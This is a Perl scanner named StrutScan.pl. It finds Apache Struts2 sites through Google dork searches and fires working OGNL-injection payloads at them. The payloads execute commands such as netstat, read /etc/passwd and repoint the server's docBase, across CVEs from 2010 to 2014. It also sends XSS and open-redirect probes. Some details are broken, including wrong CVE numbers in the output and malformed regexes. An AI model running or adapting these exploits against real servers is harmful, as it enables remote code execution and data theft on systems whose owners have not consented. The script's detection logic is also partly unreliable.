# !/url/bin/perl -w
# Name  : StrutScan.pl V2.0
# Author: riusksk
# Blog  : http://riusksk.blogbus.com
# Date  : 2014-04-23

no  warnings;
use strict;
use LWP::UserAgent;
use HTTP::Cookies;
use Encode;
use URI::Escape;
use Getopt::Long;

my ($keyword, $page, $url, $cmd, $help);
my @result = ();
my $entireurl = "";

GetOptions(
    'g=s' => \$keyword,
    'p=s' => \$page,
    'u=s' => \$url,
    'c=s' => \$cmd,
    'h!' => \$help,
);

if(!defined $keyword && !defined $url || defined $help){
    &usage();
}

if(defined $keyword) {
    my @urls = &google();
    foreach my $url(@urls){
        chomp($url);
        if($url){
            &audit($url);
        }
    }
}


if(defined $url){
    &audit($url);
}

if(@result){
    print("\n[*] 共发现".@result."个漏洞:\n\n");
    print "@result\n";
}
else{print "\n[*] 未发现漏洞！\n\n"};

sub usage(){
    print "\n";
    print "Usage:   perl\t StructScan.pl \n";
    print "\t -g\t Google 搜索语句 \n";
    print "\t -p\t 搜索结果的起始页数,默认从第1页开始\n";
    #print "\t -c\t 执行的命令\n";
    print "\t -u\t 指定网址\n";
    print "\t -h\t 帮助信息\n\n";
    print "Example: perl StructScan.pl -g \"site:qq.com filetype:action\" -p 1\n\n";
    exit;
}

sub google{
    
    my @urls = ();
    my @actionurls = ();
    my $url = "";
    if ($page < 1){
        $page = 1;
    }
    my $start = 100 * ($page-1);
    
    # 通过google搜索action 文件
	my $ua = new LWP::UserAgent;
    $ua->agent("Mozilla/5.0 (X11; Linux i686; rv:2.0.0) Gecko/20130130");
    $ua->max_redirect( 0 );
    my $response = $ua->get( "http://www.google.com.au/search?hl=zh-CN&q=".$keyword."&num=100&start=".$start )
        or die ("[*] google请求失败，请重试！\n");
    #print $response->content."\n";
    my $content = $response->content;
    
    if($content=~/找不到和您的查询/g){
    	die("[*] 搜索不到相关信息!\n\n");
    }
    # 提取搜索结果中的文件链接
    my @urls = $content =~ /<cite>(.*?)<\/cite>/ig;

    foreach my $url(@urls){
        
        chomp($url);
        $entireurl = $url;	# 保存完整的action\do\xhtml文件链接，包括其参数
        # print"完整链接：$entireurl\n";
        $url =~ /(.+?\.(action|do|xhtml))/i;
        $url = $1;
        $url = "http://".$url;
        #print "链接：$url\n";
        push(@actionurls,$url);
    }
    # print @actionurls;
    my %seen = ();
    @actionurls = grep(!$seen{$_}++ , @actionurls);  # 删除重复的文件地址
    return @actionurls;
    #print @urls;

}


sub audit(){
	
	my $url = $_[0];
	print "\n[*]检测链接：$url\n";

=pod
	if(defined $cmd){
		$temp = $cmd;
		$cmd = uri_escape($cmd);
		$cmd =~ s/\%20/+/g;
	}
	else{
		$cmd = "help";
	}

	print "命令：$cmd\n";
=cut

	my $ua = new LWP::UserAgent;
    $ua->agent("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)");
    $ua->max_redirect( 0 );


    print "[*]检测 CVE-2010-1870 Struts2/XWork < 2.2.0 远程代码执行漏洞\n";
    my $payload1 = '?(\'\43_memberAccess.allowStaticMethodAccess\')(a)=true&(b)((\'\43context[\\\'xwork.MethodAccessor.denyMethodExecution\\\']\75false\')(b))&(\'\43c\')((\'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET\')(c))&(g)((\'\43req\75@org.apache.struts2.ServletActionContext@getRequest()\')(d))&(h)((\'\43webRootzpro\75@java.lang.Runtime@getRuntime().exec(\43req.getParameter(%22cmd%22))\')(d))&(i)((\'\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())\')(d))&(i01)((\'\43webStr\75new\40byte[51020]\')(d))&(i1)((\'\43webRootzproreader.readFully(\43webStr)\')(d))&(i111)((\'\43webStr12\75new\40java.lang.String(\43webStr)\')(d))&(i2)((\'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()\')(d))&(i2)((\'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()\')(d))&(i95)((\'\43xman.getWriter().println(\43webStr12)\')(d))&(i99)((\'\43xman.getWriter().close()\')(d))&cmd=help';
    # print"攻击代码：$payload1\n";
    my $response1 = $ua->get( "$url$payload1")
        or die ("[*] 请求失败，请重试！\n");
    # print $response1->content."\n";
    my $content1 = $response1->content;
    if( ($content1=~/BOOTCFG/ig) || ($content1=~/help\ name/ig) ){
    	print "[*]存在 CVE-2010-1870 漏洞！\n";
		push(@result, $url.$payload1."\n\n");
    }

    # 需要检测参数名来注入恶意代码
    print"[*]检测 CVE-2012-0391 Apache Struts2 <= 2.2.1.1 ExceptionDelegator 远程代码执行漏洞\n";
    my $payload2 = "?id='%2b(%23_memberAccess[\"allowStaticMethodAccess\"]=true,\@org.apache.commons.io.FileUtils\@readFileToString(new%20java.io.File(%22/etc/passwd%22))%2b'";
    my $response2 = $ua->get( "$url$payload2")
        or die ("[*] 请求失败，请重试！\n");
    my $content2 = $response2->content;
    if( ($content2=~/root/ig) && ($content2=~/\/bash\/bash/ig) ){
    	print "[*] 存在 CVE-2012-0394  漏洞！\n";
		push(@result, $url.$payload2."\n\n");
    }

    print"[*]检测 CVE-2012-0394 Apache Struts2 <= 2.3.1 DebuggingInterceptor 远程代码执行漏洞\n";
    my $payload3 = "?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,\@org.apache.commons.io.FileUtils\@readFileToString(new%20java.io.File(%22/etc/passwd%22))";
    my $response3 = $ua->get( "$url$payload3")
        or die ("[*] 请求失败，请重试！\n");
    my $content3 = $response3->content;
    if( ($content3=~/root/ig) && ($content3=~/\/bin\/bash/ig) ){
    	print "[*] 存在 CVE-2012-0394 漏洞！\n";
		push(@result, $url.$payload3."\n\n");
    }


    print"[*]检测 CVE-2012-0392 Apache Struts2 <= 2.2.1.1 CookieInterceptor 远程代码执行漏洞\n";
    my $cookie = HTTP::Cookies->new;
    $cookie->clear;
    $cookie->set_cookie("(#_memberAccess[\"allowStaticMethodAccess\"]\u003dtrue)(x)=1; x[\@org.apache.commons.io.FileUtils\@readFileToString(new%20java.io.File(%22/etc/passwd%22)]=1");
    $ua->cookie_jar($cookie);
    my $response4 = $ua->get( "$url")
        or die ("[*] 请求失败，请重试！\n");
    my $content4 = $response4->content;
    if( ($content4=~/root/ig) && ($content4=~/\/bin\bash/ig) ){
    	print "[*] 存在 CVE-2012-0394  漏洞！\n";
		push(@result, $url."\n".$cookie."\n\n");
    }

    print"[*]检测 Struts 2.0.0 - 2.0.11 XSS 漏洞\n";
    my $xss = "?<script>alert(1)</script>test=hello";
    $xss = uri_escape($xss);
    my $response5 = $ua->get( "$url$xss")
        or die ("[*] 请求失败，请重试！\n");
    my $content5 = $response5->content;
    if( $content5=~/\<script\>alert\(1\)\<\/script\>/ig ){
    	print "[*] 存在 XSS 漏洞！\n";
		push(@result, $url.$xss."\n\n");
    }
    
    print"[*]检测 CVE-2011-1772 Struts 2.0.0 - 2.2.1.1 XWork XSS 漏洞\n";
    my $xss1 = "!login:cantLogin<script>alert(1)</script>=some_value";
    $xss1 = uri_escape($xss1);
    my $response6 = $ua->get("$url$xss1")
    	or die ("[*] 请求失败，请重试！\n");
    my $content6 = $response6->content;
    if($content6=~/\<script\>alert\(1\)\<\/script\>/ig){
     	print "[*] 存在 XSS 漏洞！\n";
		push(@result, $url.$xss1."\n\n");   	
    }

    print"[*]检测 CVE-2011-3923 Apache Struts2 ParametersInterceptor 远程代码执行漏洞\n";
    my $payload7 = "?class.classLoader.jarPath=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20\@java.lang.Runtime\@getRuntime%28%29.exec%28%27help%27%29%29%28meh%29&z[%28foo%29%28%27meh%27%29]=true";
    my $response7 = $ua->get( "$url$payload7")
        or die ("[*] 请求失败，请重试！\n");
    my $content7 = $response7->content;
    if( ($content7=~/BOOTCFG/ig) || ($content7=~/help\ name/ig) ){
    	print "[*] 存在 CVE-2012-0394 漏洞！\n";
		push(@result, $url.$payload7."\n\n");
    }

=pod
    print"[*]检测 Struct2 Java 浮点DoS漏洞\n";
    my $payload8 = "?(new java.lang.Double(0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000022250738585072012))";
    my $response8 = $ua->get( "$url$payload8")
        or die ("[*] 请求失败，请重试！\n");
    #sleep(5);
    my @tmp = split('//',$url);
    my @site = split('/',$tmp[1]);
    my $site = $site[0];
    #print"站点：$site\n";
    my @ping = readpipe("ping -c 5 $site");
    #print @ping;
    foreach my $ping(@ping){
    	if($ping=~/timeout/ig){
    		print"[*] 存在 Java 浮点DoS漏洞\n";
    		push(@result, $url.$payload8."\n");
    		return;
    	}
    }
=cut

    print"[*]检测 CVE-2013-2251 Apache Struts2 redirect 远程代码执行漏洞\n";
    my $payload9 = "?redirect:\$\{%23s%3dnew%20java.util.ArrayList(),%23x%3dnew%20java.lang.String(\"netstat\"),%23xx%3dnew%20java.lang.String(\"-an\"),%23s.add(%23x),%23s.add(%23xx),%23a%3dnew%20java.lang.ProcessBuilder(%23s).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23mbqdpz%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23mbqdpz.println(%23d),%23mbqdpz.close()\}";
    my $response9 = $ua->get("$url$payload9")
    	or die ("[*] 请求失败，请重试！\n");
    my $content9 = $response9->content;
    if( ($content9=~/Active\ Internet\ connections/ig) && ($content9=~/tcp/ig) ){
    	print "[*] 存在 CVE-2013-2251 漏洞！\n";
    	push(@result, $url.$payload9."\n\n");
    }

    print"[*]检测 CVE-2013-2248 Apache Struts2 redirect/redirectAction 重定向漏洞\n";
    my $payload10 = "?redirect:http://www.baidu.com/";
    my $response10 = $ua->get("$url$payload10")
        or die ("[*] 请求失败，请重试！\n");
    my $content10 = $response10->content;
    if( $content10=~/百度一下\,你就知道/ig ){
        print "[*] 存在 CVE-2013-2248 漏洞！\n";
        push(@result, $url.$payload10."\n\n");
    }

    print"[*]检测 CVE-2014-0094 Apache Struts2 ClassLoader Manipulation 远程代码执行漏洞\n";
    my $payload11 = "?Class[%27classLoader%27][%27resources%27].dirContext.docBase=/";
    my $response11 = $ua->get("$url$payload11")
        or die ("[*] 请求失败，请重试！\n");
    my $loc = rindex($url,'/');
    my $newurl = substr($url,0,$loc);
    my $payload11_2 = "etc/passwd";
    $response11 = $ua->get("$newurl$payload11_2")
        or die ("[*] 请求失败，请重试！\n");
    my $content11 = $response11->content;
    if( $content11=~/root\:\/bin/ig ){
        print "[*] 存在 CVE-2014-0094 漏洞！\n";
        push(@result, $url.$payload11_2."\n\n");
    }
}

